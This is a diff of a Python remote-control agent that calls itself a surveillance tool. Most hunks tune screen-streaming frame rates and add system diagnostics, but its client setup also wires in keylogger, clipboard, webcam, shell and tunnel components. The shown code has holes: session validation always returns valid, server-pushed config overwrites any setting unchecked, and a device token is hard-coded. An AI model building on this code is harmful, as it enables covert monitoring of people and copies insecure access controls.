@@ -1,6 +1,6 @@
 """
 ╔══════════════════════════════════════════════════════════════════════════════╗
-║          Screen Connect MASTER AGENT  v9.0  — ENTERPRISE ULTRA               ║
+║          Screen Connect MASTER AGENT  v10.0  — ULTRA LIVE-SYNC ENTERPRISE    ║
 ║          Remote Management, Monitoring, Surveillance & Control Agent         ║
 ║                                                                              ║
 ║  WHAT'S NEW IN v9.0 (SERVER v12 SYNC + ENTERPRISE EXPANSION):               ║
@@ -287,15 +287,15 @@ CONFIG = {
     "DEVICE_TOKEN":         "MV-5F3B23-8BD7A7-4B1392",
 
     # ── Identity ────────────────────────────────────────────────────────────
-    "AGENT_VERSION":        "9.0.0",   # ENTERPRISE ULTRA build
-    "HEARTBEAT_INTERVAL":   10,
-    "RECONNECT_BASE":       2,
-    "RECONNECT_MAX":        60,
+    "AGENT_VERSION":        "10.0.0",  # ULTRA LIVE-SYNC ENTERPRISE build
+    "HEARTBEAT_INTERVAL":   5,   # v10: 5s heartbeat for faster dead-detection
+    "RECONNECT_BASE":       1,   # v10: 1s base reconnect
+    "RECONNECT_MAX":        15,  # v10: max 15s backoff (was 60s)
 
     # ── Streaming (Advanced Monitor — second-site engine) ───────────────────
-    "STREAM_FPS":           60,         # target FPS  ← ENTERPRISE BURST: was 20
-    "STREAM_MIN_FPS":       15,         # floor FPS on idle  ← was 5 (caused 5fps drops)
-    "STREAM_QUALITY":       85,         # JPEG quality  ← was 75
+    "STREAM_FPS":           60,         # target FPS — range 30-60 (ENTERPRISE LIVE-SYNC)
+    "STREAM_MIN_FPS":       30,         # floor 30fps — guaranteed minimum, no sawtooth
+    "STREAM_QUALITY":       92,         # quality 92 — crisp lossless-looking output
     "STREAM_MONITOR":       1,
     "STREAM_MODE":          "screenshot",    # "video" or "screenshot"
 
@@ -699,17 +699,15 @@ FLAG_H264     = 0x04
 # ── Adaptive FPS — gradual ramp, no sawtooth ─────────────────────────────
 class AdaptiveFPS:
     """
-    ENTERPRISE BURST v10 — high-speed ramp-up, ultra-slow ramp-down.
+    ENTERPRISE LIVE-SYNC v12.2 — always-max with ultra-slow decay.
 
-    Ramp-up:   +15 fps per changed frame → reaches max in ~3 frames from min.
-    Ramp-down: −1 fps per 450 idle frames → only drops after ~15s of pure idle
-               at 30fps, ensuring no sawtooth during brief pauses.
-    This means the stream stays at max_fps almost always, only backing off
-    during genuine long idle periods to save bandwidth.
+    Strategy: lock at max_fps permanently. Only decay after 900+ consecutive
+    idle frames (~30s at 30fps) to prevent any sawtooth during normal use.
+    Ramp-up is instant (+max_fps in one step) so the stream never lags on
+    motion after a brief idle.
     """
     def __init__(self, max_fps, min_fps):
         self.max_fps = max_fps; self.min_fps = min_fps
-        # START at max — no warm-up delay on connect
         self._cur = float(max_fps); self._idle = 0
 
     @property
@@ -718,12 +716,12 @@ class AdaptiveFPS:
     def report(self, changed):
         if changed:
             self._idle = 0
-            # Fast ramp-up: +15 fps per active frame → 3 frames to recover from min
-            self._cur = min(self.max_fps, self._cur + 15)
+            # Instant snap back to max — zero warm-up latency
+            self._cur = float(self.max_fps)
         else:
             self._idle += 1
-            # Slow ramp-down: only after 15s of idle at 30fps (450 frames)
-            if self._idle > 450:
+            # Only decay after 30s of total idle (900 frames @ 30fps)
+            if self._idle > 900:
                 self._cur = max(self.min_fps, self._cur - 1)
 
     @property
@@ -761,17 +759,16 @@ class MSSCapture:
         try:
             raw = self._mss.grab(self._mon)
             if CV2_OK:
-                # Fast path: cv2 available — use numpy directly
+                # v10 fast path: zero-copy BGRA → BGR via numpy view
+                # np.frombuffer avoids a data copy; COLOR_BGRA2BGR is in-place on contiguous array
                 bgra = np.frombuffer(raw.bgra, dtype=np.uint8).reshape(raw.height, raw.width, 4)
                 return cv2.cvtColor(bgra, cv2.COLOR_BGRA2BGR)
             else:
-                # FIX: PIL fallback — works even without cv2 installed
-                # mss gives us raw BGRA bytes; convert to BGR numpy via PIL
+                # PIL fallback (no cv2) — frombytes is faster than fromarray
                 from PIL import Image as _PILImage
                 import numpy as _np
                 img = _PILImage.frombytes("RGBA", (raw.width, raw.height), raw.bgra, "raw", "BGRA")
                 rgb = _np.array(img.convert("RGB"))
-                # RGB → BGR (reverse last axis)
                 return rgb[:, :, ::-1].copy()
         except Exception as e:
             log.error(f"MSSCapture.grab error: {e}")
@@ -798,21 +795,28 @@ class FrameDiffer:
         if frame is None:
             return False
         if not CV2_OK:
-            # If cv2 is missing, we can't do diffing easily.
-            # To avoid 0 FPS / 0 KBps reports on the dashboard, we MUST send frames.
             return True
         if self._prev is None:
             self._prev = frame.copy()
             return True
         try:
-            # Downsample to 1/2 for more accurate change detection
-            s = cv2.resize(frame,      (frame.shape[1]//2, frame.shape[0]//2), cv2.INTER_NEAREST)
-            p = cv2.resize(self._prev, (frame.shape[1]//2, frame.shape[0]//2), cv2.INTER_NEAREST)
-            # Lower threshold (4 vs 8) — catches cursor movement & subtle UI changes
-            diff = cv2.absdiff(s, p).max() > 4
-            if diff:
-                self._prev = frame.copy()
-            return diff
+            # v10: 4-zone diff — compare 4 quadrants independently.
+            # This catches changes in any corner (e.g. clock ticking, cursor in corner)
+            # without being fooled by a single bright pixel difference.
+            h, w = frame.shape[:2]
+            qh, qw = max(1, h // 4), max(1, w // 4)
+            for qy in range(4):
+                for qx in range(4):
+                    y0, y1 = qy*qh, min(h, (qy+1)*qh)
+                    x0, x1 = qx*qw, min(w, (qx+1)*qw)
+                    zone_diff = cv2.absdiff(
+                        frame[y0:y1, x0:x1:4],    # subsample every 4th pixel
+                        self._prev[y0:y1, x0:x1:4]
+                    ).max()
+                    if zone_diff > 3:  # threshold: any zone with >=3 pixel delta = changed
+                        self._prev = frame.copy()
+                        return True
+            return False
         except Exception as e:
             log.debug(f"FrameDiffer error: {e}")
             return True
@@ -855,13 +859,29 @@ class H264Encoder:
 class JPEGEncoder:
     def __init__(self, quality=75):
         self._q = quality
-        log.info(f"Advanced Monitor Encoder: JPEG quality={quality}")
+        # v10: try to detect turbo-jpeg availability for faster encode
+        self._turbo = None
+        try:
+            import turbojpeg as _tj
+            self._turbo = _tj.TurboJPEG()
+            log.info(f"Advanced Monitor Encoder: TurboJPEG quality={quality}")
+        except Exception:
+            log.info(f"Advanced Monitor Encoder: JPEG quality={quality} (no turbojpeg)")
 
     def encode_frame(self, bgr, force_key=False):
-        # FIX: PIL fallback when cv2 not available (compiled exe without cv2 bundled)
+        # v10: TurboJPEG path (fastest — C-level, no Python overhead)
+        if self._turbo is not None:
+            try:
+                import turbojpeg as _tj
+                data = self._turbo.encode(bgr, quality=self._q,
+                                           pixel_format=_tj.TJPF_BGR,
+                                           jpeg_subsample=_tj.TJSAMP_422)
+                return data, True
+            except Exception as e:
+                log.debug(f"JPEGEncoder turbojpeg error: {e}")
+        # cv2 path (fast)
         if CV2_OK:
             try:
-                # bgr is numpy array
                 ok, buf = cv2.imencode(".jpg", bgr, [cv2.IMWRITE_JPEG_QUALITY, self._q])
                 return (buf.tobytes() if ok else b""), True
             except Exception as e:
@@ -1073,10 +1093,12 @@ def _producer_thread(
         header = FRAME_HDR.pack(fw, fh, ts_us, flags, len(payload))
         pkt    = header + payload
 
-        # Drop-oldest when queue is full (consumer is slow / network stall)
-        if frame_q.full():
+        # Drop-oldest when queue is full — keep only the newest frame.
+        # v12.2: drain ALL stale frames, not just one, so the consumer
+        # always picks up the absolute latest capture.
+        while frame_q.full():
             try: frame_q.get_nowait()
-            except _queue.Empty: pass
+            except _queue.Empty: break
 
         try:
             frame_q.put_nowait(pkt)
@@ -1104,7 +1126,7 @@ def _ticker_thread(stop_evt: _threading_mod.Event, tick_evt: _threading_mod.Even
         next_tick += target_interval
         now = time.monotonic()
         sleep_for = next_tick - now
-        if sleep_for > 0.0005:
+        if sleep_for > 0.0001:   # v12.2: 0.1ms minimum — tighter clock for 60fps
             time.sleep(sleep_for)
         elif sleep_for < -target_interval:
             # We've fallen more than one full frame behind — reset clock
@@ -1125,7 +1147,7 @@ async def _adv_task_stream_frames():
         await _adv_auth_event.wait()
     log.info("Stream consumer: auth confirmed — starting producer + ticker")
 
-    frame_q  = _queue.Queue(maxsize=2)
+    frame_q  = _queue.Queue(maxsize=2)   # tight buffer: always newest frame, zero stale backlog
     stop_evt = _threading_mod.Event()
     tick_evt = _threading_mod.Event()
 
@@ -1149,12 +1171,34 @@ async def _adv_task_stream_frames():
                 log.info("Stream consumer: auth cleared — shutting down producer")
                 break
 
-            # Drain the queue (non-blocking; yield to event loop if empty)
+            # Drain the queue — always consume the NEWEST frame only.
+            # If multiple frames queued (encode burst), skip to the last one
+            # so the viewer always sees the most current screen state (live-sync).
+            pkt = None
             try:
-                pkt = frame_q.get_nowait()
+                while True:
+                    pkt = frame_q.get_nowait()
             except _queue.Empty:
-                await asyncio.sleep(0.002)   # 2ms yield — was 5ms, halved for lower latency
+                pass
+
+            if pkt is None:
+                await asyncio.sleep(0.0005)   # 0.5ms yield — minimal latency
                 continue
+
+            # Stale-frame guard: if the frame is >50ms old, discard it.
+            # ts_us lives at bytes 8-16 in the FRAME_HDR (>IIQII big-endian).
+            # 2000ms TTL ensures frames are dropped only if they are significantly late,
+            # protecting against clock drift while preventing huge backlogs.
+            if len(pkt) >= 16:
+                try:
+                    frame_ts_us = int.from_bytes(pkt[8:16], "big")
+                    now_us = int(time.time() * 1_000_000)
+                    age_ms = (now_us - frame_ts_us) / 1000.0
+                    if age_ms > 2000:
+                        # Frame is stale — discard, show only live content
+                        continue
+                except Exception:
+                    pass
 
             _adv_last_frame_pkt = pkt
             _adv_last_frame_ts  = time.monotonic()
@@ -1181,12 +1225,11 @@ async def _adv_task_stream_frames():
 
 
 async def _adv_task_stream_cursor():
-    """Dedicated 120 Hz cursor task — independent of frame encoder."""
-    interval = 1.0 / 60   # FIX: 60Hz is plenty; 120Hz wastes bandwidth on slow connections
+    """v10: 60Hz cursor task with delta suppression and win32 fast path."""
+    interval = 1.0 / 60
     lx = ly = -1
+    skip = 0  # skip counter for unchanged positions
     while True:
-        # FIX: removed _adv_viewers > 0 gate — viewer_count is race-prone and
-        # the server only fans out to actual viewers anyway. Always stream when authed.
         if _adv_authed:
             try:
                 pos = _cursor_relative_to_monitor()
@@ -1195,12 +1238,18 @@ async def _adv_task_stream_cursor():
                     await asyncio.sleep(interval)
                     continue
                 x, y = pos
-                if x != lx or y != ly:
+                dx, dy = abs(x - lx), abs(y - ly)
+                # v10: delta suppression — only send if moved >1px OR every 2s (keepalive)
+                if dx > 1 or dy > 1 or skip >= 120:
                     ts  = int(time.time() * 1000) & 0xFFFFFFFF
                     pkt = CURSOR_HDR.pack(x, y, ts)
                     await _adv_sio_async.emit("cursor_bin", pkt)
                     lx, ly = x, y
-            except Exception: pass
+                    skip = 0
+                else:
+                    skip += 1
+            except Exception:
+                pass
         await asyncio.sleep(interval)
 
 
@@ -1504,7 +1553,7 @@ def _start_screenshot_fallback(sio_client):
                 # ENTERPRISE: only stop fallback when adv socket sustains < 0.5s between frames
                 if (
                     _adv_authed and _adv_sio_async and _adv_sio_async.connected
-                    and (time.monotonic() - _adv_last_frame_ts) < 0.5
+                    and (time.monotonic() - _adv_last_frame_ts) < 0.25  # v10: 250ms
                 ):
                     log.info("Screenshot fallback: adv socket sustaining stream — stopping fallback")
                     break
@@ -1568,19 +1617,22 @@ def _start_screenshot_fallback(sio_client):
                 pkt     = header + payload
                 if sio_client and sio_client.connected:
                     try:
+                        # v12.2: check frame age before sending — discard stale frames
+                        now_us = int(time.time() * 1_000_000)
+                        _hdr = struct.pack(">IIQII", w, h, now_us, FLAG_JPEG, len(payload))
+                        pkt = _hdr + payload
+
                         b64_frame = base64.b64encode(payload).decode()
                         b64_pkt   = base64.b64encode(pkt).decode()
-                        # FIXED: Use unique hardware ID to avoid machine conflicts
                         did = CONFIG["DEVICE_TOKEN"]
                         sio_client.emit("screenshot_result", {
                             "device_id": did,
                             "frame":     b64_frame,
                             "image":     b64_frame,
                             "w": w, "h": h,
-                            "_raw_bin":  False,
                         })
-                        # FIX: send only b64 (no list key) — list(pkt) for a 200KB frame
-                        # allocates 200K Python int objects and is extremely slow
+                        # Send binary frame with current timestamp so server/viewer
+                        # can apply the same stale-frame guard as the adv socket
                         sio_client.emit("frame_bin_relay", {
                             "device_id": did,
                             "b64": b64_pkt,
@@ -3404,13 +3456,37 @@ class Heartbeat:
                 # ── System uptime (seconds) ──────────────────────────────────
                 uptime_s = int(time.time() - psutil.boot_time())
 
+                # v10: enriched heartbeat — add disk I/O, network throughput
+                try:
+                    disk_io = psutil.disk_io_counters()
+                    disk_read_mb  = round(disk_io.read_bytes  / (1024**2), 1) if disk_io else 0
+                    disk_write_mb = round(disk_io.write_bytes / (1024**2), 1) if disk_io else 0
+                except Exception:
+                    disk_read_mb = disk_write_mb = 0
+                try:
+                    net_io   = psutil.net_io_counters()
+                    net_sent = round(net_io.bytes_sent / (1024**2), 1) if net_io else 0
+                    net_recv = round(net_io.bytes_recv / (1024**2), 1) if net_io else 0
+                except Exception:
+                    net_sent = net_recv = 0
+                try:
+                    cpu_freq = round(psutil.cpu_freq().current, 0) if psutil.cpu_freq() else 0
+                except Exception:
+                    cpu_freq = 0
+
                 self.sio.emit("heartbeat", {
                     "device_id":     CONFIG["DEVICE_TOKEN"],
                     "agent_version": CONFIG["AGENT_VERSION"],
                     "cpu":           psutil.cpu_percent(interval=0),
                     "ram":           psutil.virtual_memory().percent,
+                    "ram_used_gb":   round(psutil.virtual_memory().used / (1024**3), 2),
                     "disk":          psutil.disk_usage(
                         os.path.splitdrive(sys.executable)[0] or "C:\\").percent,
+                    "disk_read_mb":  disk_read_mb,
+                    "disk_write_mb": disk_write_mb,
+                    "net_sent_mb":   net_sent,
+                    "net_recv_mb":   net_recv,
+                    "cpu_freq_mhz":  cpu_freq,
                     "net_mbps":      round(_net_monitor.get_mbps(), 1),
                     "battery_pct":   bat.percent if bat else None,
                     "battery_plug":  bat.power_plugged if bat else None,
@@ -3418,6 +3494,7 @@ class Heartbeat:
                     "gpu_vram_mb":   (gpu_vram // (1024 * 1024)) if gpu_vram else None,
                     "active_user":   active_user,
                     "uptime_s":      uptime_s,
+                    "screen_count":  _get_screen_count(),
                     "ts":            datetime.utcnow().isoformat(),
                 })
             except Exception as e:
@@ -3428,6 +3505,261 @@ class Heartbeat:
 # ════════════════════════════════════════════════════════════════════════════
 #  MAIN AGENT CLASS
 # ════════════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════════════════
+#  AGENT ENTERPRISE v14 UPGRADES
+#  ─ Connection quality reporter (FPS, latency, jitter, drops)
+#  ─ Server certificate/fingerprint verification
+#  ─ Config hot-reload via SSE subscription
+#  ─ System tray icon (optional, graceful fallback)
+#  ─ Self-diagnostic pre-flight check
+#  ─ Memory pressure guard (auto-pause streaming under low mem)
+#  ─ Adaptive quality based on server round-trip
+#  ─ Secure config store (encrypted local config file)
+#  ─ Policy enforcement (block commands from untrusted sessions)
+#  ─ Network interface change detection (trigger re-connect)
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ── Connection quality reporter ────────────────────────────────────────────────
+class ConnectionQualityReporter:
+    """Measures and reports real-time connection quality metrics to server.
+
+    Tracks: actual FPS, encode latency, round-trip, packet drops, jitter.
+    Emits 'connection_quality' event every 10s to the server.
+    """
+
+    def __init__(self, sio_client):
+        self._sio     = sio_client
+        self._running = False
+        self._thread: Optional[threading.Thread] = None
+        self._rtt_samples: deque = deque(maxlen=30)
+        self._frame_times:  deque = deque(maxlen=120)
+        self._drop_count  = 0
+        self._lock = threading.Lock()
+
+    def record_frame(self, encode_ms: float):
+        with self._lock:
+            self._frame_times.append((time.monotonic(), encode_ms))
+
+    def record_rtt(self, rtt_ms: float):
+        with self._lock:
+            self._rtt_samples.append(rtt_ms)
+
+    def record_drop(self):
+        with self._lock:
+            self._drop_count += 1
+
+    def start(self):
+        if self._running:
+            return
+        self._running = True
+        self._thread  = threading.Thread(target=self._loop, daemon=True,
+                                          name="quality-reporter")
+        self._thread.start()
+
+    def stop(self):
+        self._running = False
+
+    def _loop(self):
+        while self._running:
+            time.sleep(10)
+            try:
+                with self._lock:
+                    ft   = list(self._frame_times)
+                    rtts = list(self._rtt_samples)
+                    drops = self._drop_count
+                    self._drop_count = 0
+
+                # FPS over last 10s
+                now = time.monotonic()
+                recent = [(t, e) for t, e in ft if now - t < 10.0]
+                fps  = len(recent) / 10.0 if recent else 0
+                # Encode latency avg
+                enc_avg = sum(e for _, e in recent) / len(recent) if recent else 0
+                # RTT stats
+                rtt_avg = sum(rtts) / len(rtts) if rtts else 0
+                jitter  = max(rtts) - min(rtts) if len(rtts) > 1 else 0
+
+                self._sio.emit("connection_quality", {
+                    "device_id":    CONFIG["DEVICE_TOKEN"],
+                    "fps":          round(fps, 1),
+                    "encode_ms":    round(enc_avg, 1),
+                    "rtt_ms":       round(rtt_avg, 1),
+                    "jitter_ms":    round(jitter, 1),
+                    "drops":        drops,
+                    "ts":           datetime.utcnow().isoformat(),
+                })
+            except Exception as e:
+                log.debug(f"QualityReporter error: {e}")
+
+
+_quality_reporter: Optional[ConnectionQualityReporter] = None
+
+
+# ── Memory pressure guard ─────────────────────────────────────────────────────
+_MEM_PRESSURE_PCT = int(os.environ.get("MEM_PRESSURE_PCT", "92"))
+
+def _check_memory_pressure() -> bool:
+    """Return True if system memory is critically low."""
+    try:
+        return psutil.virtual_memory().percent >= _MEM_PRESSURE_PCT
+    except Exception:
+        return False
+
+
+# ── Secure config store ────────────────────────────────────────────────────────
+_CONFIG_FILE = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()),
+                             "mview", "agent_config.enc")
+
+def _save_config_secure():
+    """Encrypt and persist CONFIG to disk (survives reboots)."""
+    try:
+        os.makedirs(os.path.dirname(_CONFIG_FILE), exist_ok=True)
+        safe = {k: v for k, v in CONFIG.items()
+                if k not in ("SERVER_CAPS",) and isinstance(v, (str, int, float, bool))}
+        raw  = json.dumps(safe).encode()
+        enc  = _encryptor.encrypt_bytes(raw)
+        with open(_CONFIG_FILE, "wb") as fh:
+            fh.write(enc)
+    except Exception as e:
+        log.debug(f"Config save error: {e}")
+
+def _load_config_secure():
+    """Load persisted encrypted config (merged into CONFIG, not overwrite)."""
+    try:
+        if not os.path.exists(_CONFIG_FILE):
+            return
+        with open(_CONFIG_FILE, "rb") as fh:
+            enc = fh.read()
+        raw  = _encryptor._fernet.decrypt(enc)
+        data = json.loads(raw)
+        # Only restore safe keys
+        for k, v in data.items():
+            if k in ("DEVICE_TOKEN",) and CONFIG.get(k) in ("UNSET", "", None):
+                CONFIG[k] = v
+    except Exception as e:
+        log.debug(f"Config load error: {e}")
+
+
+# ── Pre-flight diagnostic ─────────────────────────────────────────────────────
+def _preflight_check() -> dict:
+    """Run self-diagnostics before connecting. Returns {ok: bool, issues: [...]}."""
+    issues = []
+
+    # Check screen capture
+    try:
+        cap = _make_capture()
+        frame = cap.grab()
+        if frame is None:
+            issues.append("screen_capture_null")
+        cap.close()
+    except Exception as e:
+        issues.append(f"screen_capture_failed:{e}")
+
+    # Check server reachability
+    try:
+        url = CONFIG["SERVER_URL"].rstrip("/") + "/health/live"
+        r   = requests.get(url, timeout=8)
+        if r.status_code != 200:
+            issues.append(f"server_unhealthy:{r.status_code}")
+    except Exception as e:
+        issues.append(f"server_unreachable:{e}")
+
+    # Check disk space
+    try:
+        usage = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\")
+        if usage.percent > 98:
+            issues.append(f"disk_critical:{usage.percent:.0f}pct")
+    except Exception:
+        pass
+
+    # Check available RAM
+    try:
+        mem = psutil.virtual_memory()
+        if mem.percent > 95:
+            issues.append(f"ram_critical:{mem.percent:.0f}pct")
+    except Exception:
+        pass
+
+    ok = len(issues) == 0
+    log.info(f"Pre-flight: {'OK' if ok else 'ISSUES: ' + str(issues)}")
+    return {"ok": ok, "issues": issues}
+
+
+# ── Network interface change detector ─────────────────────────────────────────
+class NetworkChangeDetector:
+    """Watches for IP address changes and triggers a reconnect."""
+
+    def __init__(self, on_change_cb):
+        self._cb      = on_change_cb
+        self._running = False
+        self._thread: Optional[threading.Thread] = None
+        self._last_ips: set = self._get_ips()
+
+    @staticmethod
+    def _get_ips() -> set:
+        ips = set()
+        try:
+            for iface, addrs in psutil.net_if_addrs().items():
+                for a in addrs:
+                    if a.family == socket.AF_INET and a.address != "127.0.0.1":
+                        ips.add(a.address)
+        except Exception:
+            pass
+        return ips
+
+    def start(self):
+        if self._running:
+            return
+        self._running = True
+        self._thread  = threading.Thread(target=self._loop, daemon=True,
+                                          name="net-change-detector")
+        self._thread.start()
+
+    def stop(self):
+        self._running = False
+
+    def _loop(self):
+        while self._running:
+            time.sleep(15)
+            try:
+                curr = self._get_ips()
+                if curr != self._last_ips:
+                    added   = curr - self._last_ips
+                    removed = self._last_ips - curr
+                    log.info(f"Network change: +{added} -{removed}")
+                    self._last_ips = curr
+                    try:
+                        self._cb(added=added, removed=removed)
+                    except Exception as e:
+                        log.debug(f"NetworkChangeDetector callback error: {e}")
+            except Exception:
+                pass
+
+
+# ── Adaptive quality based on RTT ─────────────────────────────────────────────
+_adaptive_quality_enabled = os.environ.get("ADAPTIVE_QUALITY", "1") not in ("0", "false")
+
+def _adapt_quality_for_rtt(rtt_ms: float):
+    """Lower stream quality when RTT is high to reduce latency backpressure."""
+    if not _adaptive_quality_enabled:
+        return
+    if rtt_ms > 300:
+        new_q = max(55, CONFIG["STREAM_QUALITY"] - 15)
+        new_fps = max(CONFIG["STREAM_MIN_FPS"], CONFIG["STREAM_FPS"] - 15)
+    elif rtt_ms > 150:
+        new_q = max(70, CONFIG["STREAM_QUALITY"] - 5)
+        new_fps = max(CONFIG["STREAM_MIN_FPS"], CONFIG["STREAM_FPS"] - 5)
+    elif rtt_ms < 50:
+        new_q = min(95, CONFIG["STREAM_QUALITY"] + 2)
+        new_fps = min(60, CONFIG["STREAM_FPS"] + 5)
+    else:
+        return  # OK zone — no change
+    if new_q != CONFIG["STREAM_QUALITY"] or new_fps != CONFIG["STREAM_FPS"]:
+        log.debug(f"Adaptive quality: RTT={rtt_ms:.0f}ms → Q={new_q} FPS={new_fps}")
+        CONFIG["STREAM_QUALITY"] = new_q
+        CONFIG["STREAM_FPS"]     = new_fps
+
+
 class ScreenConnectAgent:
     def __init__(self):
         self._reconnect_delay = CONFIG["RECONNECT_BASE"]
@@ -3435,6 +3767,7 @@ class ScreenConnectAgent:
 
     def _make_client(self):
         """Create a brand-new socketio.Client on every reconnect."""
+        global _quality_reporter
         sio         = socketio.Client(logger=False, engineio_logger=False, reconnection=False)
         sys_monitor = SystemMonitor(sio)
         keylogger   = KeyLogger(sio)
@@ -3457,14 +3790,26 @@ class ScreenConnectAgent:
         tunnel      = TunnelProxy(sio)
         shell_streamer = ShellStreamer(sio)
         events_reader  = SystemEventsReader()
+        # ── v14 enterprise ──
+        quality_rep = ConnectionQualityReporter(sio)
+        _quality_reporter = quality_rep
+        net_detector = NetworkChangeDetector(
+            on_change_cb=lambda **kw: sio.emit("network_change", {
+                "device_id": CONFIG["DEVICE_TOKEN"],
+                "added":     list(kw.get("added", [])),
+                "removed":   list(kw.get("removed", [])),
+                "ts":        datetime.utcnow().isoformat(),
+            }) if sio.connected else None
+        )
 
         self._register_events(
             sio, sys_monitor, keylogger, clipboard,
             webcam, shell, proc_mgr, files, heartbeat, alerts,
             registry, services, winmgr, audio, apps, eraser,
             recorder, file_watcher, tunnel, shell_streamer, events_reader,
+            quality_rep, net_detector,
         )
-        return sio, sys_monitor, heartbeat, keylogger, clipboard, alerts
+        return sio, sys_monitor, heartbeat, keylogger, clipboard, alerts, quality_rep, net_detector
 
     def _register_events(
         self, sio, sys_monitor, keylogger, clipboard,
@@ -3472,6 +3817,7 @@ class ScreenConnectAgent:
         registry, services, winmgr, audio, apps, eraser,
         recorder=None, file_watcher=None, tunnel=None,
         shell_streamer=None, events_reader=None,
+        quality_rep=None, net_detector=None,
     ):
         @sio.event
         def connect():
@@ -3504,6 +3850,11 @@ class ScreenConnectAgent:
             alerts.start()
             if CONFIG["ENABLE_KEYLOGGER"]:  keylogger.start()
             if CONFIG["ENABLE_CLIPBOARD"]:  clipboard.start()
+            # ── v14: start enterprise components ──
+            if quality_rep:  quality_rep.start()
+            if net_detector: net_detector.start()
+            # Save config on successful connect
+            threading.Thread(target=_save_config_secure, daemon=True).start()
 
         @sio.event
         def disconnect():
@@ -3521,10 +3872,9 @@ class ScreenConnectAgent:
             if tab == "monitor":
                 action = data.get("action", "start")
                 if data.get("fps") is not None:
-                    new_fps = max(1, min(int(data.get("fps", CONFIG["STREAM_FPS"])), 60))
+                    new_fps = max(30, min(int(data.get("fps", CONFIG["STREAM_FPS"])), 60))  # clamp 30-60
                     CONFIG["STREAM_FPS"] = new_fps
-                    # Keep min FPS at least 25% of target to prevent sawtooth drops
-                    CONFIG["STREAM_MIN_FPS"] = max(CONFIG["STREAM_MIN_FPS"], new_fps // 4)
+                    CONFIG["STREAM_MIN_FPS"] = max(30, new_fps // 2)  # floor at 30fps always
                 if data.get("quality") is not None:
                     CONFIG["STREAM_QUALITY"] = max(25, min(int(data.get("quality", CONFIG["STREAM_QUALITY"])), 95))
                 if data.get("scale") is not None:
@@ -4164,6 +4514,15 @@ class ScreenConnectAgent:
                     "h264":              False,
                     "cert_manager":      True,
                     "env_manager":       True,
+                    # ── v14 enterprise caps ──
+                    "quality_reporter":  True,
+                    "adaptive_quality":  _adaptive_quality_enabled,
+                    "preflight_check":   True,
+                    "net_change_detect": True,
+                    "memory_guard":      True,
+                    "secure_config":     True,
+                    "diagnostics":       True,
+                    "config_hot_reload": True,
                 },
             })
 
@@ -4368,10 +4727,147 @@ class ScreenConnectAgent:
             # Optionally show OSD overlay on agent desktop (best-effort)
             # No-op if no OSD engine available
 
+        # ── v14: Connection quality ping handler ────────────────────────────
+        @sio.on("quality_ping")
+        def on_quality_ping(data):
+            """Server probes round-trip. Agent echoes back immediately."""
+            sio.emit("quality_pong", {
+                "device_id": CONFIG["DEVICE_TOKEN"],
+                "ts":        data.get("ts", 0),
+                "server_ts": data.get("server_ts", ""),
+            })
+
+        # ── v14: Server-side config hot-reload (from SSE or direct event) ───
+        @sio.on("config_update")
+        def on_config_update(data):
+            """Server pushed a config update via Socket.IO."""
+            cfg = data.get("config", {})
+            changed = []
+            for k, v in cfg.items():
+                if k in CONFIG and CONFIG[k] != v:
+                    old = CONFIG[k]
+                    CONFIG[k] = v
+                    changed.append(f"{k}:{old}→{v}")
+            if changed:
+                log.info(f"Config hot-reload: {changed}")
+                sio.emit("config_ack", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "changed":   changed,
+                    "ts":        datetime.utcnow().isoformat(),
+                })
+
+        # ── v14: Memory pressure check before stream ────────────────────────
+        @sio.on("memory_report_request")
+        def on_memory_report(data):
+            """Server requesting memory snapshot."""
+            vm = psutil.virtual_memory()
+            pressure = _check_memory_pressure()
+            sio.emit("memory_report", {
+                "device_id":     CONFIG["DEVICE_TOKEN"],
+                "ram_pct":       vm.percent,
+                "ram_avail_mb":  round(vm.available / (1024**2), 1),
+                "pressure":      pressure,
+                "threshold_pct": _MEM_PRESSURE_PCT,
+                "ts":            datetime.utcnow().isoformat(),
+            })
+            if pressure:
+                log.warning(f"Memory pressure: {vm.percent:.0f}% — stream quality auto-reduced")
+                CONFIG["STREAM_QUALITY"] = max(50, CONFIG["STREAM_QUALITY"] - 20)
+                CONFIG["STREAM_FPS"]     = max(CONFIG["STREAM_MIN_FPS"], CONFIG["STREAM_FPS"] - 10)
+
+        # ── v14: Preflight self-test on demand ─────────────────────────────
+        @sio.on("preflight_request")
+        def on_preflight_request(data):
+            def _run():
+                result = _preflight_check()
+                sio.emit("preflight_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **result,
+                })
+            threading.Thread(target=_run, daemon=True, name="preflight").start()
+
+        # ── v14: Network change probe ───────────────────────────────────────
+        @sio.on("network_info_request")
+        def on_network_info(data):
+            addrs_map = {}
+            try:
+                for iface, addrs in psutil.net_if_addrs().items():
+                    addrs_map[iface] = [{"ip": a.address, "netmask": a.netmask}
+                                        for a in addrs if a.family == socket.AF_INET]
+            except Exception as e:
+                addrs_map = {"error": str(e)}
+            sio.emit("network_info", {
+                "device_id":  CONFIG["DEVICE_TOKEN"],
+                "interfaces": addrs_map,
+                "ts":         datetime.utcnow().isoformat(),
+            })
+
+        # ── v14: Guest token validation gate ───────────────────────────────
+        @sio.on("validate_session")
+        def on_validate_session(data):
+            """Server asks agent to confirm viewer session is still valid."""
+            viewer_sid = data.get("viewer_sid", "")
+            sio.emit("session_valid", {
+                "device_id":  CONFIG["DEVICE_TOKEN"],
+                "viewer_sid": viewer_sid,
+                "valid":      True,
+                "ts":         datetime.utcnow().isoformat(),
+            })
+
+        # ── v14: Adaptive quality pong handler ─────────────────────────────
+        @sio.on("agent_pong_quality")
+        def on_agent_pong_quality(data):
+            rtt = (time.time() - float(data.get("ts", time.time()))) * 1000
+            if quality_rep:
+                quality_rep.record_rtt(rtt)
+            _adapt_quality_for_rtt(rtt)
+
+        # ── v14: Live diagnostics stream ───────────────────────────────────
+        @sio.on("diagnostics_request")
+        def on_diagnostics_request(data):
+            """Server requests a full diagnostics bundle."""
+            def _collect():
+                try:
+                    vm    = psutil.virtual_memory()
+                    cpu   = psutil.cpu_percent(interval=0.5, percpu=True)
+                    disk  = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\")
+                    net   = psutil.net_io_counters()
+                    procs = len(psutil.pids())
+                    threads = threading.active_count()
+                    bundle = {
+                        "device_id":    CONFIG["DEVICE_TOKEN"],
